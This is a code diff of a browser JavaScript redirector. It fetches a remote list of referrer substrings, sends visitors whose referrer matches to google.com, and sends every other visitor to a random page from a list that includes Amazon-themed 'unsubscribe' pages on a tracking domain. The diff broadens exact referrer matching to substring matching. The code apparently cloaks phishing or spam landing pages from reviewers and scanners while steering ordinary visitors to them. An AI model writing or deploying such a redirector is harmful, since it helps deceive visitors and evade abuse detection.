@@ -1,4 +1,4 @@
-// Static redirect URL for all referrers
+// Static redirect URL for all matching substrings
 const staticRedirectUrl = "https://www.google.com";
 
 // List of URLs
@@ -25,18 +25,19 @@ const urls = [
     "https://server-tracking.eu/amz/unsubscribe-112024-01.html"
 ];
 
+
 // Function to handle redirection
-function redirectToRandomUrl(referrers) {
+function redirectToRandomUrl(substrings) {
     const referrer = document.referrer;
 
-    // Check if the referrer is in the list
-    if (referrers.includes(referrer)) {
+    // Check if the referrer contains any of the substrings
+    if (substrings.some(substring => referrer.includes(substring))) {
         console.log(`Redirecting visitor from referrer ${referrer} to ${staticRedirectUrl}`);
         window.location.href = staticRedirectUrl;
         return;
     }
 
-    // Redirect to a random URL if no referrer match
+    // Redirect to a random URL if no substring match
     if (!urls || urls.length === 0) {
         console.error("No URLs available for redirection.");
         return;
@@ -49,8 +50,8 @@ function redirectToRandomUrl(referrers) {
     window.location.href = randomUrl;
 }
 
-// Load referrers from JSON file and execute redirection
-fetch('https://hellonetwork2023.github.io/sc/referrers.json')
+// Load substrings from JSON file and execute redirection
+fetch('https://hellonetwork2023.github.io/sc/substrings.json')
     .then(response => {
         if (!response.ok) {
             throw new Error(`HTTP error! status: ${response.status}`);
@@ -58,15 +59,15 @@ fetch('https://hellonetwork2023.github.io/sc/referrers.json')
         return response.json();
     })
     .then(data => {
-        const referrers = data.referrers || [];
-        console.log('Loaded referrers:', referrers);
+        const substrings = data.substrings || [];
+        console.log('Loaded substrings:', substrings);
 
-        // Execute the redirection logic with loaded referrers
-        redirectToRandomUrl(referrers);
+        // Execute the redirection logic with loaded substrings
+        redirectToRandomUrl(substrings);
     })
     .catch(error => {
-        console.error('Error loading referrers:', error);
+        console.error('Error loading substrings:', error);
 
-        // Fallback to random redirection if referrers fail to load
+        // Fallback to random redirection if substrings fail to load
         redirectToRandomUrl([]);
     });
